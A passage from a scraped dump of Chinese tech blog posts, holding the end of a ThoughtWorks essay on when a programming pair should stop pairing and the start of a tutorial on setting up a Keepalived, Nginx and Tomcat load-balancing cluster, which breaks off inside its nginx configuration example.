Lead，今天在忙另外一个事情。这个周五真是不得安宁，恨不得想到美国去过过昨天。</p>\n<p>Zen听到两个人的讨论，虽然并不了解这个问题的细节，但直觉上认为是跑偏了。马上提醒Ben和Martin：</p>\n<blockquote><p>这不是一个很难的问题，我感觉你们想复杂了？是不是走偏了？能给我说一下你们怎么想的么？</p></blockquote>\n<p>被Zen打断的Martin说了一下之前的解决方案，也说试过了其他的方案了，都不行。由于Zen对这个事情也不是很了解，所以只是提了一个醒：</p>\n<blockquote><p>“Keep it simple，别把事情整复杂了。”</p></blockquote>\n<p>两个人的讨论依然在继续，Ben有点无法跟上Martin的思路，艰难地写着代码，但每次都不对。Pair的气氛犹如冬日里冰冷的咖啡一样凝结，不知道孰是孰非。Ben已经有些不高兴，Martin则依然在一旁指指点点但并不动手。</p>\n<p>Zen一看表已经3点钟了，又插了一句嘴：</p>\n<blockquote><p>Martin，既然你对这个更熟悉，你来操刀吧。你来写代码吧。</p></blockquote>\n<p>可能由于之前的讨论过于激烈，Martin反驳Zen：</p>\n<blockquote><p>我们在Pair啊，他对RxJava不熟悉，我应该指导他。我看着他写就可以了。</p></blockquote>\n<p>Zen说，</p>\n<blockquote><p>你们的解决方案是什么，给我看看。</p></blockquote>\n<p>解释了一通以后，Zen也没有更多的想法，就让他们继续吧。但Zen建议道：</p>\n<blockquote><p>在这个紧要的关头，我们应该改变一下Pair的方式。现在不是教授知识，而是要高效的解决问题。在这种压力的情境下，你可以直接实现自己的思路，带着别人飞就好了。</p></blockquote>\n<h3><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/3.jpg\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/3-1024x683.jpg\" alt=\"\" width=\"700\" height=\"467\"></a></h3>\n<h3>分歧</h3>\n<p>Martin稍微冷静了下，拿过键盘，继续开始修复问题。Ben这时候在一旁观察，也适当的休息一下，之前手忙脚乱的按F8、F9的神经也得以缓和。</p>\n<blockquote><p>Ben：看来还是不行。我们再理一下代码吧。</p>\n<p>Martin：你说的这些我之前都试过，都不行，要这样才行。</p>\n<p>Ben：我说的是这样做的，既然我们还没讨论清楚，我们再来看一下代码吧。</p></blockquote>\n<p>两人拿出了纸和笔，对着屏幕一边画一边讨论，然而Ben并不认可Martin的方案，说要采用另外个方案。Martin则坚持认为这是一个可行的方案，得试试。Ben拿过键盘，准备按照Martin的方案写代码，但心里面颇为不爽，一直在想说服Martin采用他的方案试试。</p>\n<h3>怒气</h3>\n<p>到此时，时间都已经不知不觉过去两个小时了，然而问题似乎离真相总是忽远忽近。两个人已经疲劳不堪，再加上解决方案的不一致，两人的言语中开始显露出一些怒气。</p>\n<p>Zen在运行测试的空档，打断了两人的对话，建议道：</p>\n<blockquote><p>既然大家已经产生了分歧，要不然两个人分开，各自实现一个，看谁能够先实现，然后再来讨论。</p></blockquote>\n<p>Martin对于Zen并不认同，认为Zen指责他和Ben没有Pair好。</p>\n<p>Zen解释道：</p>\n<blockquote><p>其实我听出了两人意见的不统一，言语中已经有一些怒火，这样下去Pair的效率很低。首先，大家带着不爽来干活，互相质疑。更关键的是，解决问题已经用去了两个多小时，大家都比较疲惫，可以适当休息。我让你们分开的目的是让大家冷静一下，在不受打扰的情况下工作一段时间，可能会不一样。</p></blockquote>\n<h3>冷静</h3>\n<p>Martin回到了电脑面前，按照他的思路一步一步做下去。Ben去上了个厕所，倒掉了那杯冷冰冰的咖啡，泡了杯热茶。回到电脑前专注的重新按照他的思路一步一步走下去。</p>\n<p>其实两个人已经接近了真相，只是这之间不停的对话把注意力消耗殆尽。两人企图达到一个统一，然而口头的对话并不能解决问题，反而暂缓了这个过程。</p>\n<p>10分钟后，Ben兴高采烈的说已经搞出来了一套可以运行的方案，叫Martin一同过来看看。Ben的临时解决方案比较简单好理解，但并不完美。熟悉RxJava的Martin指出了一些可以改进的地方。</p>\n<p>然后两人又开始了新一轮的Pair，重新将这个方案完善。有了这个基础的解决方案，两人都很高兴，是朝着一个正确的方向大步向前。</p>\n<h3>尾声</h3>\n<p>下午6点半，虽然比正常下班晚了半个多小时，但还好整个解决方案都正常了，交付的任务也顺利完成。</p>\n<p>Ben和Martin都总结道，我们应该停止结对，当：</p>\n<ul>\n<li>两人的思路不统一但无法说服对方时：我们可以考虑分开一阵，安静一下，各自用可运行的代码来证明思路的可行。这里只需要相对粗糙的代码即可。</li>\n<li>时间已经超过番茄时间而感到疲惫时：人的专注力是有限的，在Pair时非常累，特别是在能力方面存在较大差距的时候。在这时候我们可以试试番茄工作法，让大脑得到休息。</li>\n<li>注意力不集中或者有其他事务要处理时：在Pair的时候，彼此要尊重对方，不要玩手机、看其他无关的网页，除非事先取得别人的同意，否则就要等到停止结对、处理完事务后再继续。</li>\n</ul>\n<div></div>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113474\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113474votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113474\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina\">ThoughtWorks</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina\">\r\n\t\t\t<img src=\"http://tp3.sinaimg.cn/1774908135/180/0/1\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            ThoughtWorks是一家全球IT咨询公司，追求卓越软件质量，致力于科技驱动商业变革。擅长构建定制化软件产品，帮助客户快速将概念转化为价值。同时为客户提供用户体验设计、技术战略咨询、组织转型等咨询服务。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/thoughtworkschina\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/thoughtworkschina/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 78</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://insights.thoughtworkers.org/\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/thoughtworkschina\"><i class=\"fa fa-weibo\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/5b209ef18b0ddc4867f0966539835ac1a09275ec.jpg"}
{"url_object_id": "fb10c29fd52231cba79635856a16c3f9", "title": "搭建Keepalived + Nginx + Tomcat的高可用负载均衡架构", "url": "http://blog.jobbole.com/113347/", "create_date": "2017/12/18", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2013/07/Nginx-Logo.jpg"], "praise_nums": 2, "comment_nums": 1, "favor_nums": 3, "tags": "IT技术,Keepalived,Nginx,Tomcat", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://my.oschina.net/feinik/blog/1590941\">FEINIK</a>   </div><h1 id=\"h1_0\">1 概述</h1>\n<p>初期的互联网企业由于业务量较小，所以一般单机部署，实现单点访问即可满足业务的需求，这也是最简单的部署方式，但是随着业务的不断扩大，系统的访问量逐渐的上升，单机部署的模式已无法承载现有的业务量，需要进行服务集群化部署，本文主要介绍服务端Tomcat多实例部署，以及如何保证web服务的高可用方案。</p>\n<ul>\n<li>Nginx 是一个高性能的 HTTP反向代理服务器</li>\n<li>Keepalived 是一个基于VRRP协议来实现的LVS服务高可用方案，可以利用其来避免服务的单点故障</li>\n<li>Tomcat 是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器。</li>\n</ul>\n<h1 id=\"h1_1\">2 Nginx的高可用负载均衡架构</h1>\n<p>如下图：为典型的Tomcat服务多实例部署的架构图</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fml0ntgngoj20f70evmxu.jpg\" width=\"547\" height=\"535\"></p>\n<p>（1）用户通过域名请求到DNS，由DNS解析域名后返回对应的IP地址，该IP及为Keepalived映射服务器的虚拟IP</p>\n<p>（2）通过该虚拟IP访问到对应的负载均衡器（Nginx），这里Nginx部署两个，然后通过Keepalived来保证NG的高可用，正常情况下由Keepalived-M将虚拟IP映射转发至Nginx-M，如果Nginx-M出现故障，此时Keepalived会切换至Keepalived-S开始工作，从而保证了NG的单点故障问题。</p>\n<p>（3）通过Nginx负载均衡器，将请求路由到对应的Tomcat服务。</p>\n<h1 id=\"h1_2\">3 搭建Keepalived + Nginx + Tomcat的高可用负载均衡架构</h1>\n<h2 id=\"h2_3\">3.1 需要准备的软件</h2>\n<p>（1）apache-tomcat-8.5.16.tar.gz</p>\n<p>（2）nginx-1.12.2.tar.gz</p>\n<p>（3）keepalived-1.3.9.tar.gz</p>\n<h2 id=\"h2_4\">3.2 服务器准备</h2>\n<p>两台服务器如：192.168.10.11，192.168.10.12</p>\n<h2 id=\"h2_5\">3.3 安装需要的依赖包</h2>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a346e69a850835026\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ yum -y install gcc gcc-c++ automake pcre pcre-devel zlib zlib-devel open openssl-devel</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a346e69a850835026-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a346e69a850835026-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">yum</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">install </span><span class=\"crayon-e\">gcc </span><span class=\"crayon-v\">gcc</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">c</span><span class=\"crayon-o\">++</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">automake </span><span class=\"crayon-e\">pcre </span><span class=\"crayon-v\">pcre</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">devel </span><span class=\"crayon-e\">zlib </span><span class=\"crayon-v\">zlib</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">devel </span><span class=\"crayon-e\">open </span><span class=\"crayon-v\">openssl</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">devel</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p></p>\n<h2 id=\"h2_6\">3.4 安装</h2>\n<h3 id=\"h3_7\">3.4.1 安装Tomcat</h3>\n<p>（1）分别在两台服务器中安装Tomcat，解压apache-tomcat-8.5.16.tar.gz及可完成安装。</p>\n<h3 id=\"h3_8\">3.4.2 安装Nginx</h3>\n<p>（1）解压安装包：tar -zxvf nginx-1.12.2.tar.gz</p>\n<p>（2）进入到nginx-1.12.2目录：cd nginx-1.12.2</p>\n<p>（3）编译：</p>\n<p>a) ./configure –with-http_stub_status_module –with-http_ssl_module  –prefix=/usr/local/nginx</p>\n<p>b) sudo make &amp;&amp; sudo make install</p>\n<h3 id=\"h3_9\">3.4.3 安装Keepalived</h3>\n<p>（1）解压安装包：tar -zxvf keepalived-1.3.9.tar.gz</p>\n<p>（2）进入到keepalived-1.3.9目录：cd keepalived-1.3.9</p>\n<p>（3）执行编译：</p>\n<p>a）./configure –prefix=/usr/local/keepalived –sysconf=/etc</p>\n<p>b）sudo make &amp;&amp; sudo make install</p>\n<h2 id=\"h2_10\">3.5 配置</h2>\n<h3 id=\"h3_11\">3.5.1 分别配置两台服务器的Nginx</h3>\n<p>（1）分别修改两台服务器nginx配置文件，vi /usr/local/nginx/conf/nginx.conf</p>\n<p>（2）内容如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a346e6a4986962589\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#nginx进程数\r\nworker_processes  1;\r\n\r\n#单个进程最大连接数\r\nevents {\r\n    worker_connections  1024;\r\n}\r\n\r\n#http服务器配置\r\nhttp {\r\n    include       mime.types;\r\n    default_type  application/octet-stream;\r\n    sendfile        on;\r\n\t#长连接超时时间，单位是秒\r\n    keepalive_timeout  65;\r\n\t#upstream负载均衡配置，配置路由到tomcat的服务地址以及权重\r\n    upstream localhost{\r\n       server 192.168.10.11:8080 weight=2;\r\n       server 192.168.10.12:8080 weight=2;\r\n    }\r\n\t\r\n\t#虚拟主机的配置\r\n    server {\r\n\t    #监听端口\r\n        listen       80;\r\n\t\t #域名可以有多个，用空格隔开\r\n        server_name  localhost;\r\n        location / {\r\n            root   html;\r\n            index  index.html index.htm;\r\n\t\t\t#nginx跟后端服务器连接超时时间(代理连接超时)\r\n            proxy_connect_timeout 3;\r\n\t\t\t#后端服务器数据回传时间(代理发送超时)\r\n            proxy_send_timeout 30;\r\n\t\t\t#连接成功后，后端服务器响应时间(代理接收超时)\r\n            proxy_read_timeout 30;\r\n            proxy_pass http://localhost;\r\n        }\r\n\r\n        error_page   500 502 503 504  /50x.html;\r\n        location = /50x.html {\r\n            root   html;\r\n        }\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a4986962589-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a4986962589-45\">45</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-1\"><span class=\"crayon-p\">#nginx进程数</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-2\"><span class=\"crayon-v\">worker</span><span class=\"crayon-sy\">_</span>processes<span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-4\"><span class=\"crayon-p\">#单个进程最大连接数</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-5\"><span class=\"crayon-e\">events</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">worker</span><span class=\"crayon-sy\">_</span>connections<span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1024</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-7\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-8\"> </div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-9\"><span class=\"crayon-p\">#http服务器配置</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-10\"><span class=\"crayon-e\">http</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">include       </span><span class=\"crayon-v\">mime</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">types</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">default_type  </span><span class=\"crayon-v\">application</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">octet</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">stream</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">sendfile        </span><span class=\"crayon-v\">on</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-14\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#长连接超时时间，单位是秒</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">keepalive</span><span class=\"crayon-sy\">_</span>timeout<span class=\"crayon-h\">  </span><span class=\"crayon-cn\">65</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-16\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#upstream负载均衡配置，配置路由到tomcat的服务地址以及权重</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-17\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">upstream</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">localhost</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-18\"><span class=\"crayon-h\">       </span><span class=\"crayon-i\">server</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.10.11</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8080</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">weight</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-19\"><span class=\"crayon-h\">       </span><span class=\"crayon-i\">server</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.10.12</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8080</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">weight</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-21\"><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-22\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#虚拟主机的配置</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">server</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-24\"><span class=\"crayon-h\">\t    </span><span class=\"crayon-p\">#监听端口</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-25\"><span class=\"crayon-h\">        </span><span class=\"crayon-i\">listen</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">80</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-26\"><span class=\"crayon-h\">\t\t </span><span class=\"crayon-p\">#域名可以有多个，用空格隔开</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">server_name  </span><span class=\"crayon-v\">localhost</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-28\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">location</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-29\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">root   </span><span class=\"crayon-v\">html</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-30\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">index  </span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">html </span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">htm</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-31\"><span 